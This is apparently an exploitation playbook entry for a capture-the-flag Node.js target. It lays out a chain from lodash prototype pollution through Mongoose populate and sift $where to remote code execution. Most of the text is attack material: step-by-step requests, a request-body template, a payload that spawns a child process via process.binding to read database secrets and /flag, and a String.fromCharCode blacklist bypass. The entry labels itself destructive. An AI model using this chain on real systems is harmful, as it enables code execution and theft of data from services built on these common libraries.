---
name: lodash_set_mongoose_populate_sift_where_rce
vuln_type: prototype_pollution
sub_technique: lodash_set_mongoose_sift_rce
category: exploitation
safety_level: destructive
tags:
- prototype-pollution
- lodash
- mongoose
- sift
- where
- rce
- nodejs
- blacklist-bypass
---

# Lodash  .Set() Constructor.Prototype Pollution → Mongoose Populate + Sift $Where → New Function() Rce

## When to Apply

POST /config calls `_.set(config, path, value)` where path is an array like `['constructor','prototype','select']`. A blacklist checks for forbidden strings but can be bypassed via String.fromCharCode(). The main route does `Quote.find({}).populate('author','name')` — polluted Object.prototype.select and Object.prototype.populate force additional Mongoose behavior. When match is an array, Mongoose's assignVals uses sift(), and sift's $where implementation calls `new Function('obj','return '+payload)` → RCE.

## Prerequisites

- lodash _.set() with array path input (enables constructor.prototype access)
- Mongoose populate() reading inherited options from prototype
- sift 'where' implementation using new Function()
- Blacklist bypassable via String.fromCharCode()
- Quote ObjectId obtainable from page

## Steps

1. GET / to obtain a quote ObjectId (qid).
2. POST /config to pollute Object.prototype.select:
   `{tmp: {$cond: [{$ifNull: ['$secret', false]}, {$toObjectId: qid}, null]}}`
3. POST /config to pollute Object.prototype.populate:
   `[{path:'tmp', model:'Quote', match:[{$or:[{$where: PAYLOAD}]}], strictPopulate:false}]`
4. Stage 1 $where payload: leak `this.constructor.db.host|port|name` → <cite> output.
5. Stage 2 $where payload: `process.binding('spawn_sync').spawn(...)` to run child `node -e "..."` that connects to leaked MongoDB, reads all authors.secret, XOR-decrypts /flag.
6. GET / to trigger populate chain → flag appears in page.

## Code Template

```
body = {
  config_name: [['constructor','prototype','select'], ['constructor','prototype','populate']],
  value: [
    {tmp: {$cond: [{$ifNull: ['$secret', false]}, {$toObjectId: qid}, null]}},
    [{path:'tmp', model:'Quote', match:[{$or:[{$where: payload}]}], strictPopulate:false, populate:null}]
  ]
}
```

## Examples

### Example 1

- **blacklist_bypass**: String.fromCharCode() for '/', '.', 'output', 'client'
- **rce_method**: process.binding('spawn_sync').spawn({file:'node',args:['node','-e',script]})
- **decrypt**: XOR each author.secret with /flag bytes → find DH{...} match

Two-stage RCE: first leak DB connection info, then spawn child process for full MongoDB access. The blacklist bypass via String.fromCharCode() and bracket notation is essential. Object.values(result)[2][1] replaces .output to avoid blacklist.
